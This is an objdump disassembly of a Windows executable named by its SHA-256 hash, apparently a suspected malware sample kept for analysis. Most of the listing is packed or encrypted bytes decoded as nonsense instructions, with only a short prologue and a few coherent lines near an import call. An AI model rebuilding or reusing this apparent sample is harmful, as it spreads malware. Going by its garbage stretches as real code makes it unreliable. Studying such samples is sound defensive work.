
c294783fe38ed829ff553bf3c9ef195e921a5df3a9c4d224b8fdf5fe6bb1745b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    eax,DWORD PTR [ebp-0x50]
  401009:	mov    ecx,DWORD PTR [ebp-0x4c]
  40100c:	mov    edx,DWORD PTR [ebp-0x50]
  40100f:	add    DWORD PTR ds:0x428471,0x428511
  401019:	sub    eax,edx
  40101b:	mov    DWORD PTR ds:0x428495,ecx
  401021:	push   edi
  401022:	mov    edi,DWORD PTR [ebp-0x4c]
  401025:	mov    DWORD PTR [ebp-0x50],eax
  401028:	not    edx
  40102a:	sbb    ecx,edi
  40102c:	inc    DWORD PTR ds:0x42837d
  401032:	mov    DWORD PTR [ebp-0x4c],ecx
  401035:	or     DWORD PTR [ebp-0x50],0xcb78dc42
  40103c:	sub    DWORD PTR ds:0x428489,ecx
  401042:	or     DWORD PTR [ebp-0x4c],0x9c2b8ae8
  401049:	mov    edx,DWORD PTR ds:0x428451
  40104f:	xor    DWORD PTR ds:0x428595,edx
  401055:	mov    eax,DWORD PTR [ebp-0x58]
  401058:	jmp    0x4013f9
  40105d:	(bad)  
  40105e:	mov    edi,0x9098bf8d
  401063:	cwde   
  401064:	(bad)  
  401065:	mov    cl,BYTE PTR [esi+ebp*4-0x31]
  401069:	stc    
  40106a:	inc    ecx
  40106b:	mov    edx,0xbebebea4
  401070:	mov    esi,0xbebec4bd
  401075:	push   0x1691bceb
  40107a:	ds out 0x1f,al
  40107d:	(bad)  [eax+0x5be9ef0]
  401083:	lds    ebx,FWORD PTR [edi]
  401085:	(bad)  
  401086:	xlat   BYTE PTR ds:[ebx]
  401087:	ffree  st(5)
  401089:	outs   dx,BYTE PTR gs:[esi]
  40108b:	mov    ecx,0x723deed2
  401090:	repnz cmc 
  401092:	adc    al,0x95
  401094:	out    0xc5,eax
  401096:	ss mov cl,0x7e
  401099:	test   DWORD PTR [edx+0xd339a63],esp
  40109f:	repz or BYTE PTR [ecx-0x2c],al
  4010a3:	fisub  WORD PTR [ebx+0x39d2cc4]
  4010a9:	mov    ?,WORD PTR [esp+eax*4-0x44]
  4010ad:	int    0xf4
  4010af:	cmp    esp,eax
  4010b1:	icebp  
  4010b2:	arpl   WORD PTR ds:0xfe52947e,dx
  4010b8:	call   0x4be36aff
  4010bd:	pop    eax
  4010be:	rcr    bl,1
  4010c0:	inc    esi
  4010c1:	dec    ebp
  4010c2:	shl    DWORD PTR [edx+0x79],0x32
  4010c6:	sub    edi,DWORD PTR [ebx-0x13b6c9c8]
  4010cc:	inc    edx
  4010cd:	lds    ebp,FWORD PTR [esi]
  4010cf:	cmp    DWORD PTR [eax+edi*4-0x3c10b663],esp
  4010d6:	jnp    0x40108a
  4010d8:	cmp    esi,edi
  4010da:	jle    0x401145
  4010dc:	mov    esi,0xbd592451
  4010e1:	shl    ebx,cl
  4010e3:	xchg   edx,eax
  4010e4:	rol    bl,1
  4010e6:	sbb    al,0x61
  4010e8:	ins    BYTE PTR es:[edi],dx
  4010e9:	nop
  4010ea:	aas    
  4010eb:	jecxz  0x401159
  4010ed:	mov    esp,es
  4010ef:	inc    ebp
  4010f0:	leave  
  4010f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010f2:	inc    ecx
  4010f3:	ss popf 
  4010f5:	xchg   edi,eax
  4010f6:	(bad)  
  4010f7:	rcl    BYTE PTR [ecx+0x776649bb],1
  4010fd:	pop    ss
  4010fe:	mov    ah,BYTE PTR [ecx]
  401100:	adc    BYTE PTR [edi],ah
  401102:	js     0x40117a
  401104:	jns    0x401134
  401106:	or     edi,ecx
  401108:	dec    esp
  401109:	mov    bh,0xd1
  40110b:	xor    eax,0xbf20903f
  401110:	adc    ecx,esi
  401112:	dec    esp
  401113:	cmp    al,0xd1
  401115:	mov    dl,0x87
  401117:	std    
  401118:	std    
  401119:	mov    bl,0x65
  40111b:	sbb    al,0xe2
  40111d:	add    edi,eax
  40111f:	call   FWORD PTR [ecx+0x55]
  401122:	cdq    
  401123:	ficomp DWORD PTR [eax+0x72ec971]
  401129:	inc    edx
  40112a:	jne    0x4010b0
  40112c:	es push es
  40112e:	sub    BYTE PTR [ebx+0x4a8093ae],ah
  401134:	sar    BYTE PTR [edi+esi*2],0xd7
  401138:	jmp    0xc7a366ca
  40113d:	shl    DWORD PTR es:[edi],0x7e
  401141:	shr    BYTE PTR ds:0xdf48071c,0x70
  401148:	push   es
  401149:	mul    DWORD PTR [ecx]
  40114b:	nop
  40114c:	push   ebx
  40114d:	(bad)  
  40114e:	xor    eax,0xa9fddbaa
  401153:	add    eax,0x90a27139
  401158:	addr16 dec eax
  40115a:	mov    ds:0xf90335b,eax
  40115f:	outs   dx,BYTE PTR ds:[esi]
  401160:	xor    al,BYTE PTR [eax-0x37bdfde2]
  401166:	ja     0x40110d
  401168:	pop    edi
  401169:	in     eax,0xb
  40116b:	sti    
  40116c:	retf   
  40116d:	sbb    bl,bl
  40116f:	inc    ecx
  401170:	sub    al,0x7b
  401172:	fwait
  401173:	cmp    bh,BYTE PTR [ecx+0x51a57358]
  401179:	mov    eax,ds:0x16ce78a7
  40117e:	xchg   ebx,eax
  40117f:	shl    BYTE PTR [ecx],0x4d
  401182:	loopne 0x4011de
  401184:	inc    ebp
  401185:	jne    0x4011b8
  401187:	in     eax,dx
  401188:	sbb    eax,0x3a3ed07d
  40118d:	scas   al,BYTE PTR es:[edi]
  40118e:	inc    ebp
  40118f:	xchg   eax,esp
  401191:	xor    BYTE PTR [esi+0x154445b8],0x2d
  401198:	(bad)  
  401199:	js     0x4011af
  40119b:	sbb    bl,BYTE PTR [ecx+0x5b]
  40119e:	jmp    0x9c6df0c6
  4011a3:	pop    ebx
  4011a4:	rol    cl,0x53
  4011a7:	add    BYTE PTR [eax],dh
  4011a9:	(bad)  
  4011aa:	(bad)  
  4011ac:	scas   eax,DWORD PTR es:[edi]
  4011ad:	sub    esi,ecx
  4011af:	loopne 0x401207
  4011b1:	cli    
  4011b2:	mov    esi,0x669eed70
  4011b7:	add    al,0x18
  4011b9:	inc    ecx
  4011ba:	push   0x0
  4011bc:	cmp    BYTE PTR [esi],ch
  4011be:	arpl   bp,dx
  4011c0:	mov    BYTE PTR [ebp+eiz*8+0x77],al
  4011c4:	inc    ebp
  4011c5:	pop    es
  4011c6:	mov    edx,0x446dcc49
  4011cb:	test   DWORD PTR [eax],ebx
  4011cd:	mov    al,0x13
  4011cf:	push   0x6eccd4b4
  4011d4:	fst    DWORD PTR [edx-0xe60d0f3]
  4011da:	jns    0x4011a0
  4011dc:	(bad)
  4011e0:	push   es
  4011e1:	inc    edi
  4011e2:	dec    ecx
  4011e3:	jecxz  0x4011d2
  4011e5:	cmp    DWORD PTR [edi-0x7f5d7b7f],esp
  4011eb:	cdq    
  4011ec:	sar    ebp,1
  4011ee:	pop    ecx
  4011ef:	jecxz  0x4011d3
  4011f1:	retf   0x21a3
  4011f4:	jmp    0xf4fd:0x90181c5e
  4011fb:	or     esp,ebx
  4011fd:	jns    0x4011b0
  4011ff:	aam    0x45
  401201:	inc    ecx
  401202:	pop    eax
  401203:	push   esp
  401204:	or     edx,DWORD PTR [edx-0x4f]
  401207:	mov    edi,0xda1850c6
  40120c:	fadd   st(4),st
  40120e:	push   0xffffffcc
  401210:	aam    0x44
  401212:	pop    es
  401213:	pop    ds
  401214:	lock fbld TBYTE PTR [esi+0x6d]
  401218:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401219:	or     eax,DWORD PTR [esi-0x80]
  40121c:	scas   eax,DWORD PTR es:[edi]
  40121d:	or     BYTE PTR [ecx-0x42],ch
  401220:	sbb    BYTE PTR [ebp-0x62],ch
  401223:	push   0xec89132c
  401228:	js     0x4011dd
  40122a:	enter  0x2cc,0x90
  40122e:	retf   0x297
  401231:	dec    esi
  401232:	ins    DWORD PTR es:[edi],dx
  401233:	mov    edx,0x4d63008c
  401238:	inc    esi
  401239:	out    0x5,eax
  40123b:	dec    eax
  40123c:	outs   dx,WORD PTR ss:[esi]
  40123f:	mov    dl,0xe6
  401241:	pop    ecx
  401242:	and    DWORD PTR [ecx+0x1c6a3f45],ebx
  401248:	pop    ss
  401249:	das    
  40124a:	dec    edx
  40124b:	fnsave [ecx+0x4f171ee2]
  401251:	js     0x40126e
  401253:	jns    0x401200
  401255:	call   0xabb88571
  40125a:	add    al,0x45
  40125c:	adc    cl,bh
  40125e:	into   
  40125f:	inc    ecx
  401260:	cmp    esi,DWORD PTR [esi+0x66693f7a]
  401266:	inc    ebx
  401267:	dec    esi
  401268:	popa   
  401269:	prefetch (bad)
  40126a:	or     eax,0xb610f2ff
  40126f:	cli    
  401270:	jno    0x401281
  401272:	mov    ecx,0x3e48d53
  401277:	push   ss
  401278:	(bad)  
  401279:	push   edi
  40127a:	pop    esp
  40127b:	js     0x4012d4
  40127d:	or     DWORD PTR [edi+0x748fe3dd],0xab7ae662
  401287:	xchg   ebx,eax
  401288:	mov    cl,0x2
  40128a:	cli    
  40128b:	sub    al,0x5
  40128d:	sbb    DWORD PTR [ecx],0xe4d5933f
  401293:	pop    ss
  401294:	mov    DWORD PTR [si],ecx
  401297:	pop    esi
  401298:	jae    0x4012de
  40129a:	cwde   
  40129b:	adc    eax,0x8fcf7003
  4012a0:	popf   
  4012a1:	pop    ss
  4012a2:	or     DWORD PTR [edx],eax
  4012a4:	in     al,0x92
  4012a6:	add    eax,esp
  4012a8:	sbb    ebp,edi
  4012aa:	(bad)  
  4012ab:	or     al,0xf8
  4012ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012ae:	cdq    
  4012af:	mov    ds:0xa4c56c6a,al
  4012b4:	xchg   ecx,eax
  4012b5:	jg     0x401240
  4012b7:	pop    ss
  4012b8:	std    
  4012b9:	sub    ebx,DWORD PTR [ebp+0x6db62a7a]
  4012bf:	pop    ds
  4012c0:	mov    esp,0xadbee33d
  4012c5:	test   eax,0xfdc80ea3
  4012ca:	retf   
  4012cb:	mov    esi,0xbd9e314b
  4012d0:	imul   DWORD PTR [ecx+eiz*8]
  4012d3:	in     al,dx
  4012d4:	outs   dx,BYTE PTR ds:[esi]
  4012d5:	sbb    bl,BYTE PTR ds:0xb9132607
  4012db:	fcomp  QWORD PTR [ecx-0x2bccee99]
  4012e1:	dec    ebp
  4012e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012e3:	dec    edi
  4012e4:	jmp    0x9ec3:0x23fc8069
  4012eb:	test   BYTE PTR [esi-0xf],bh
  4012ee:	fstp   DWORD PTR [eax-0x46050101]
  4012f4:	aam    0x1c
  4012f6:	(bad)  
  4012f7:	push   esp
  4012f8:	pop    esi
  4012f9:	xchg   ebp,eax
  4012fa:	dec    eax
  4012fb:	aas    
  4012fc:	mov    ch,BYTE PTR [esi+eax*1-0x4d]
  401300:	sub    bl,BYTE PTR [ebx]
  401302:	dec    ebx
  401303:	mov    edx,0xe4a2aedb
  401308:	pop    ecx
  401309:	shr    BYTE PTR [ebx],1
  40130b:	cld    
  40130c:	cs (bad) 
  40130e:	mov    edi,0xfc1d9d58
  401313:	xchg   edi,eax
  401314:	imul   edi,DWORD PTR [edx-0x21],0x72a3bbbe
  40131b:	jnp    0x40136a
  40131d:	(bad)  
  40131e:	in     eax,0x4a
  401320:	cld    
  401321:	out    dx,al
  401322:	xchg   esi,eax
  401323:	cmp    ecx,ebx
  401325:	jne    0x401378
  401327:	mov    ds:0x595f385f,al
  40132c:	jmp    0x2985167f
  401331:	fisub  DWORD PTR [esp+eax*4]
  401334:	daa    
  401335:	scas   al,BYTE PTR es:[edi]
  401336:	sub    DWORD PTR [ecx],ebx
  401338:	mov    ah,0xb9
  40133a:	pusha  
  40133b:	jne    0x40131c
  40133d:	(bad)  
  40133e:	jle    0x40132a
  401340:	lods   eax,DWORD PTR ds:[esi]
  401341:	enter  0xa622,0x7d
  401345:	fstcw  WORD PTR [ecx+0x22f9261e]
  40134c:	retf   
  40134d:	mov    eax,0x2cd006a0
  401352:	rcl    BYTE PTR [ebx],0x5e
  401355:	stos   DWORD PTR es:[edi],eax
  401356:	pop    es
  401357:	inc    esp
  401358:	sahf   
  401359:	or     DWORD PTR ds:0x9a6dec20,ebx
  40135f:	lock jmp 0x69804cfd
  401365:	nop
  401366:	mov    ch,0xb7
  401368:	out    dx,al
  401369:	cld    
  40136a:	and    al,0xda
  40136c:	add    edx,DWORD PTR [edi-0x4f]
  40136f:	add    eax,DWORD PTR [esi+0x3a]
  401372:	scas   eax,DWORD PTR es:[edi]
  401373:	shr    DWORD PTR [edx],1
  401375:	push   esp
  401376:	rol    BYTE PTR [esi+0x30],0xca
  40137a:	sti    
  40137b:	mov    WORD PTR [eax-0x1f],fs
  40137e:	sbb    esp,DWORD PTR [edx-0x2195453]
  401384:	cli    
  401385:	jmp    0xe0ac133e
  40138a:	sbb    al,0xa
  40138c:	push   ecx
  40138d:	xor    eax,0xe8e14fce
  401392:	fisubr DWORD PTR [ebx-0x1f728aa8]
  401398:	xor    BYTE PTR [edi+0x6b20c244],bh
  40139e:	inc    eax
  40139f:	fwait
  4013a0:	xchg   ebp,eax
  4013a1:	shr    DWORD PTR [ebx+0x18114352],1
  4013a7:	imul   ebx,DWORD PTR [di+0x1e],0xe
  4013ac:	push   ss
  4013ad:	inc    eax
  4013ae:	jg     0x4013a9
  4013b0:	(bad)  
  4013b1:	pop    edi
  4013b2:	mov    esp,0xca475f99
  4013b7:	sbb    eax,0xc1267acf
  4013bc:	cwde   
  4013bd:	das    
  4013be:	mov    bh,al
  4013c0:	pop    eax
  4013c1:	aad    0x8d
  4013c3:	xor    DWORD PTR [ebx],ebp
  4013c5:	jmp    0x401430
  4013c7:	sub    eax,0xb151d86f
  4013cc:	mov    eax,0x96f559f3
  4013d1:	mov    DWORD PTR [esi+esi*1+0x7a],ebp
  4013d5:	jno    0x401382
  4013d7:	sbb    esi,DWORD PTR [eax+0x2d]
  4013da:	mov    DWORD PTR [esi],ebp
  4013dc:	jecxz  0x4013c8
  4013de:	stc    
  4013df:	or     eax,0xf076521f
  4013e4:	cwde   
  4013e5:	fdiv   DWORD PTR [esi]
  4013e7:	out    dx,al
  4013e8:	dec    eax
  4013e9:	in     al,0xb5
  4013eb:	pop    ebp
  4013ec:	xchg   DWORD PTR [eax+0x6a],eax
  4013ef:	jecxz  0x401461
  4013f1:	mov    dl,0xf9
  4013f3:	or     edi,DWORD PTR [ebx]
  4013f5:	adc    BYTE PTR [eax+0x70],bh
  4013f8:	push   edx
  4013f9:	mov    ecx,DWORD PTR [ebp-0x54]
  4013fc:	add    edi,DWORD PTR ds:0x4284f1
  401402:	mov    edx,DWORD PTR [ebp-0x58]
  401405:	sbb    DWORD PTR ds:0x428509,ecx
  40140b:	mov    edi,DWORD PTR [ebp-0x54]
  40140e:	sub    DWORD PTR ds:0x428595,0x1812
  401418:	sub    eax,edx
  40141a:	movzx  edx,BYTE PTR ds:0x428481
  401421:	jmp    0x4017c2
  401426:	test   BYTE PTR [edx+0x7cbcfc08],0x3a
  40142d:	mov    WORD PTR [esi+0x6e],es
  401430:	rcl    DWORD PTR [eax-0x1c59f51e],cl
  401436:	mov    ebp,0xbdbebec4
  40143b:	les    edi,FWORD PTR [esi+0x66cc86be]
  401441:	xchg   edx,eax
  401442:	ins    DWORD PTR es:[edi],dx
  401443:	jle    0x401445
  401445:	fldcw  WORD PTR ds:0x272ba00a
  40144b:	sub    BYTE PTR ds:0x4ec33d1a,dl
  401451:	cmp    BYTE PTR [eax-0x2b],0x25
  401455:	rol    DWORD PTR [edx+0x52ffe096],1
  40145b:	xor    eax,0x3bf93129
  401460:	in     al,0xca
  401462:	test   DWORD PTR [ebx+0x34],ecx
  401465:	cmp    eax,0x131f1958
  40146a:	sbb    al,0x22
  40146c:	aam    0xfc
  40146e:	jne    0x4014c6
  401470:	rcr    ebx,0x97
  401473:	jnp    0x401476
  401475:	xor    DWORD PTR [ecx+edi*2-0x18],eax
  401479:	jp     0x401408
  40147b:	jo     0x4014a7
  40147d:	jl     0x401445
  40147f:	repnz push ds
  401481:	iret   
  401482:	shl    DWORD PTR [ebp-0x18dceab2],1
  401488:	jle    0x401471
  40148a:	xchg   esi,eax
  40148b:	xor    BYTE PTR ds:0x50a26d0b,0x7b
  401492:	adc    ebp,DWORD PTR [esi]
  401494:	sub    eax,0xc67a531d
  401499:	test   eax,0x3eead97f
  40149e:	push   ds
  40149f:	dec    eax
  4014a0:	mov    ?,WORD PTR ds:[eax+ecx*4+0x137c291d]
  4014a8:	dec    esp
  4014a9:	popf   
  4014aa:	pop    es
  4014ab:	lds    esi,FWORD PTR [ebp+0x25]
  4014ae:	in     al,0xf2
  4014b0:	mov    al,0x77
  4014b2:	dec    ebp
  4014b3:	neg    DWORD PTR [esi-0x1570c7b3]
  4014b9:	dec    ecx
  4014ba:	aas    
  4014bb:	jge    0x4014ce
  4014bd:	mov    esp,0x5766e2c1
  4014c2:	stos   DWORD PTR es:[edi],eax
  4014c3:	adc    ebp,DWORD PTR [edi]
  4014c5:	mov    ah,bh
  4014c7:	(bad)  
  4014c9:	test   al,0x91
  4014cb:	xor    ebx,DWORD PTR [edx+0x173df396]
  4014d1:	call   0x25ad:0xebfc3bea
  4014d8:	sub    al,0x91
  4014da:	mov    bl,0x38
  4014dc:	xlat   BYTE PTR ds:[ebx]
  4014dd:	jg     0x401517
  4014df:	(bad)  
  4014e0:	xchg   ebx,eax
  4014e1:	or     DWORD PTR [ebx],edi
  4014e3:	adc    DWORD PTR [ebp+0x7216aa5e],esi
  4014e9:	ins    DWORD PTR es:[edi],dx
  4014ea:	retf   
  4014eb:	xchg   ebx,eax
  4014ec:	retf   0x46d0
  4014ef:	push   eax
  4014f0:	pop    eax
  4014f1:	aad    0xde
  4014f3:	sar    BYTE PTR [eax],cl
  4014f5:	mov    dh,0x8b
  4014f7:	retf   
  4014f8:	jg     0x40147e
  4014fa:	(bad)
  4014fd:	xor    bh,BYTE PTR [ebx+0x4f]
  401500:	jg     0x401520
  401502:	sbb    bl,dl
  401504:	popf   
  401505:	jge    0x401492
  401507:	pop    es
  401508:	test   eax,0x2911e5d1
  40150d:	jmp    0xa39afed8
  401512:	push   esi
  401513:	jle    0x4014ba
  401515:	call   0x945a:0x79296bd4
  40151c:	ds sbb eax,0xc0e2b396
  401522:	sub    eax,0x76fd8905
  401527:	retf   0x4caf
  40152a:	lea    ebx,[eax]
  40152c:	mov    edx,0x2f5962bd
  401531:	scas   al,BYTE PTR es:[edi]
  401532:	icebp  
  401533:	cwde   
  401534:	(bad)  
  401535:	in     al,0x60
  401537:	cmp    ecx,DWORD PTR [ebp-0x458920fa]
  40153d:	xchg   ebx,eax
  40153e:	pop    ebp
  40153f:	mov    ds:0xc75849b6,al
  401544:	loop   0x40150a
  401546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401547:	or     al,0xbc
  401549:	add    eax,0xcc4e1876
  40154e:	dec    BYTE PTR [ecx+0x17]
  401551:	jge    0x401510
  401553:	cmp    al,0x95
  401555:	and    eax,0x5b0a395
  40155a:	aad    0x2a
  40155c:	in     al,0xec
  40155e:	cs xor al,0x44
  401561:	pop    es
  401562:	and    eax,0x1cdce63e
  401567:	cmp    esp,DWORD PTR [ebp+0x4fc39937]
  40156d:	fadd   QWORD PTR [ebx-0x59a3c0f9]
  401573:	fs jl  0x40153e
  401576:	sahf   
  401577:	inc    esp
  401578:	aas    
  401579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40157a:	mov    dh,0x6d
  40157c:	jl     0x40152c
  40157e:	imul   ebx,DWORD PTR [ebp+0x1c],0x3c
  401582:	rcl    al,cl
  401584:	nop
  401585:	jmp    0xd5e4:0xa45ecfaa
  40158c:	and    ecx,edx
  40158e:	enter  0xe876,0xde
  401592:	pop    edx
  401593:	dec    ebp
  401594:	(bad)  
  401595:	daa    
  401596:	retf   
  401597:	test   BYTE PTR [ecx],0x64
  40159a:	inc    edx
  40159b:	pop    ss
  40159c:	pop    ds
  40159d:	jp     0x40153b
  40159f:	hlt    
  4015a0:	ss mov edi,0x49579854
  4015a6:	xchg   edx,eax
  4015a7:	pop    ecx
  4015a8:	ficom  WORD PTR [esi+0x38]
  4015ab:	imul   ecx,DWORD PTR [esi+0x2e],0xffffffbe
  4015af:	dec    eax
  4015b0:	cmc    
  4015b1:	out    dx,eax
  4015b2:	pusha  
  4015b3:	hlt    
  4015b4:	(bad)  
  4015b5:	sbb    al,0x1d
  4015b7:	mov    cl,0x21
  4015b9:	leave  
  4015ba:	push   ecx
  4015bb:	jle    0x401549
  4015bd:	or     ebx,DWORD PTR [ecx-0x555d0072]
  4015c3:	push   0x79d39d44
  4015c8:	fnsave [edi]
  4015ca:	lods   al,BYTE PTR ds:[esi]
  4015cb:	repz push ecx
  4015cd:	sbb    al,0xea
  4015cf:	dec    eax
  4015d0:	les    eax,FWORD PTR [esp+edi*1]
  4015d3:	sbb    esp,DWORD PTR ds:0x2fbdbf20
  4015d9:	iret   
  4015da:	ret    0x6f99
  4015dd:	jb     0x401626
  4015df:	sti    
  4015e0:	cdq    
  4015e1:	or     DWORD PTR [esi],esp
  4015e3:	and    al,0x5a
  4015e5:	push   esp
  4015e6:	int3   
  4015e7:	adc    al,0xb7
  4015e9:	popf   
  4015ea:	push   esp
  4015eb:	jmp    0xae02c6bb
  4015f0:	inc    ecx
  4015f1:	aas    
  4015f2:	pop    ebp
  4015f3:	add    al,BYTE PTR [ecx]
  4015f5:	cmp    al,0x64
  4015f7:	fild   WORD PTR [ecx-0xa71ec1f]
  4015fd:	adc    al,0x5e
  4015ff:	test   esp,ecx
  401601:	pcmpgtb mm6,QWORD PTR [ebx+0x20]
  401605:	in     eax,0xb1
  401607:	popf   
  401608:	ins    BYTE PTR es:[edi],dx
  401609:	add    DWORD PTR [edi-0x46b6321a],eax
  40160f:	sub    al,0xd2
  401611:	push   0xffffffd6
  401613:	bnd jnp 0x401607
  401616:	daa    
  401617:	and    ebx,DWORD PTR [edi]
  401619:	lds    ebx,FWORD PTR [edi+0x33]
  40161c:	in     al,dx
  40161d:	xchg   ebp,eax
  40161e:	jo     0x40160d
  401620:	jnp    0x4015b5
  401622:	loope  0x401613
  401624:	push   ebp
  401625:	and    eax,0xf850194c
  40162a:	xchg   esp,eax
  40162b:	psllw  mm4,mm7
  40162e:	push   ss
  40162f:	add    al,0x23
  401631:	out    dx,al
  401632:	cmp    ebx,DWORD PTR [ebx]
  401634:	jo     0x401617
  401636:	sub    bh,BYTE PTR [edi]
  401638:	mov    eax,ds:0x98f6c1
  40163d:	enter  0xc161,0x20
  401641:	push   ebx
  401642:	nop
  401643:	ror    ebx,0x1
  401646:	inc    ebx
  401647:	jecxz  0x40169a
  401649:	frstor [ebp-0x41]
  40164c:	mov    dh,0xd0
  40164e:	push   0xbb42ee3
  401653:	mov    al,ds:0x8fb13349
  401658:	cmp    DWORD PTR [ebx],esi
  40165a:	pop    eax
  40165b:	push   ss
  40165c:	pop    ebx
  40165d:	nop
  40165e:	js     0x401672
  401660:	test   BYTE PTR [eax],ah
  401662:	and    eax,0x549a3b8
  401667:	and    ah,BYTE PTR [edi+0x7b]
  40166a:	dec    ebp
  40166b:	std    
  40166c:	fstp   TBYTE PTR [ebx+edx*4+0x5ae7660c]
  401673:	pop    edx
  401674:	jmp    0x4016be
  401676:	test   edi,0xd0add5b2
  40167c:	xor    edx,DWORD PTR [edi+0x1767ef49]
  401682:	inc    eax
  401683:	ret    0x56cd
  401686:	pusha  
  401687:	jbe    0x401684
  401689:	pop    ds
  40168a:	in     eax,dx
  40168b:	sub    BYTE PTR [edi],ch
  40168d:	shl    DWORD PTR [ecx+0x754a7fe3],0x8b
  401694:	outs   dx,BYTE PTR ds:[esi]
  401695:	xchg   edx,eax
  401696:	cmp    BYTE PTR [edx+0x76],ch
  401699:	push   eax
  40169a:	fwait
  40169b:	dec    ebx
  40169c:	pop    ds
  40169d:	jo     0x40164b
  40169f:	js     0x40164c
  4016a1:	inc    eax
  4016a2:	add    BYTE PTR [edx-0x42ccfb4],0xfc
  4016a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016aa:	leave  
  4016ab:	retf   
  4016ac:	xchg   ecx,eax
  4016ad:	fmul   st,st(7)
  4016af:	std    
  4016b0:	pop    ebx
  4016b1:	push   esi
  4016b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016b3:	dec    edx
  4016b4:	inc    ebx
  4016b5:	jle    0x401701
  4016b7:	push   edx
  4016b8:	repnz retf 0x2ee1
  4016bc:	leave  
  4016bd:	(bad)  
  4016bf:	lods   eax,DWORD PTR ds:[esi]
  4016c0:	cmp    DWORD PTR [edx],ebx
  4016c2:	pop    ds
  4016c3:	fwait
  4016c4:	mov    ch,0x3e
  4016c6:	push   eax
  4016c7:	neg    edi
  4016c9:	into   
  4016ca:	add    BYTE PTR [eax-0x59ec6ca],bl
  4016d0:	fwait
  4016d1:	or     al,0x44
  4016d3:	or     al,0x20
  4016d5:	xor    al,0x85
  4016d7:	fs xor cl,BYTE PTR cs:[edi+0xc]
  4016dc:	pusha  
  4016dd:	inc    ebp
  4016de:	lods   eax,DWORD PTR fs:[esi]
  4016e0:	es leave 
  4016e2:	push   eax
  4016e3:	xchg   edi,eax
  4016e4:	dec    esp
  4016e5:	adc    edi,ebp
  4016e7:	shl    DWORD PTR [eax-0x249e54cf],0x45
  4016ee:	xlat   BYTE PTR ds:[ebx]
  4016ef:	arpl   WORD PTR [eax+0x5a],bx
  4016f2:	xchg   ebp,eax
  4016f3:	(bad)  
  4016f4:	pusha  
  4016f5:	ficom  DWORD PTR [esi-0x5f8ac1e4]
  4016fb:	cmp    ebx,DWORD PTR [esi-0x5d07bb8e]
  401701:	loop   0x4016d0
  401703:	pop    ebp
  401704:	xchg   edx,eax
  401705:	icebp  
  401706:	mov    edx,0x2bd1acc6
  40170b:	adc    al,0xb6
  40170d:	adc    eax,0x9c2eeb46
  401712:	push   ecx
  401713:	fld    QWORD PTR [ebp+0x74]
  401716:	loop   0x40169e
  401718:	cmp    esp,DWORD PTR [ebx+0x4646bba6]
  40171e:	stos   DWORD PTR es:[edi],eax
  40171f:	hlt    
  401720:	and    dl,bl
  401722:	sbb    al,0x19
  401724:	xor    al,0x87
  401726:	sub    bl,cl
  401728:	and    DWORD PTR [edi+0x3e],ecx
  40172b:	cmp    al,0xcb
  40172d:	sub    eax,0x7a385311
  401732:	pop    esp
  401733:	les    ebx,FWORD PTR [edi+ebx*2-0x51]
  401737:	pop    ds
  401738:	repnz cmc 
  40173a:	or     al,0x75
  40173c:	push   0xfef1feac
  401741:	inc    edx
  401742:	inc    esp
  401743:	add    eax,0x3928ce02
  401748:	sbb    ebp,DWORD PTR [edi+0x4f]
  40174b:	scas   al,BYTE PTR es:[edi]
  40174c:	mov    al,ds:0x1f6f124
  401751:	out    dx,al
  401752:	gs aam 0x30
  401755:	aaa    
  401756:	daa    
  401757:	jmp    0x39867312
  40175c:	repz or BYTE PTR [edx+eax*8+0x59],0xac
  401762:	(bad)  
  401763:	(bad)  
  401764:	pop    ecx
  401765:	push   esp
  401766:	in     eax,0x3d
  401768:	mov    ah,0xaf
  40176a:	xchg   DWORD PTR [esi+esi*2],esi
  40176d:	xchg   ebp,eax
  40176e:	sub    al,0x81
  401770:	xchg   ecx,eax
  401771:	adc    BYTE PTR [esi],ah
  401773:	sbb    bh,bh
  401775:	wrmsr  
  401777:	call   edx
  401779:	or     dh,BYTE PTR [edx]
  40177b:	and    eax,DWORD PTR [esp+ebx*1-0x67]
  40177f:	push   es
  401780:	in     eax,0x7e
  401782:	arpl   cx,ax
  401784:	cdq    
  401785:	into   
  401786:	les    esp,FWORD PTR ds:0xe0b4ab68
  40178c:	push   edx
  40178d:	loop   0x401735
  40178f:	mov    eax,0x2a677e5e
  401794:	and    esi,DWORD PTR [ebp+0x47807b32]
  40179a:	xchg   esp,eax
  40179b:	pop    edx
  40179c:	shl    bh,0xef
  40179f:	rcr    BYTE PTR [ecx-0x58],1
  4017a2:	fwait
  4017a3:	dec    edx
  4017a4:	or     ebx,esp
  4017a6:	xchg   bh,dh
  4017a8:	add    eax,0x8be097a8
  4017ad:	jle    0x4017db
  4017af:	mov    WORD PTR [ebp+0x63],?
  4017b2:	xchg   ecx,eax
  4017b3:	sahf   
  4017b4:	dec    edx
  4017b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017b6:	ja     0x4017f8
  4017b8:	or     ch,bh
  4017ba:	cmp    eax,0xe276f673
  4017bf:	mov    ebp,DWORD PTR ds:0xa845897a
  4017c5:	sbb    ecx,edi
  4017c7:	mov    DWORD PTR [ebp-0x54],ecx
  4017ca:	or     ecx,0x1b77
  4017d0:	or     DWORD PTR [ebp-0x58],0xcb78a05a
  4017d7:	adc    DWORD PTR ds:0x428471,edi
  4017dd:	or     DWORD PTR [ebp-0x54],0x9c2b8ae8
  4017e4:	lea    eax,[ebp+0x20]
  4017e7:	cmp    DWORD PTR ds:0x428469,0x0
  4017ee:	mov    edi,DWORD PTR ds:0x428585
  4017f4:	movzx  ecx,WORD PTR ds:0x428379
  4017fb:	mov    ecx,0x7757
  401800:	jmp    0x401860
  401805:	mov    ecx,0x59da
  40180a:	cmp    DWORD PTR ds:0x428469,0x0
  401811:	ja     0x401846
  401817:	push   0x4282b5
  40181c:	call   DWORD PTR ds:0x42e09c
  401822:	xor    edx,edx
  401824:	or     edx,DWORD PTR ds:0x428375
  40182a:	xor    DWORD PTR ds:0x4284e5,edx
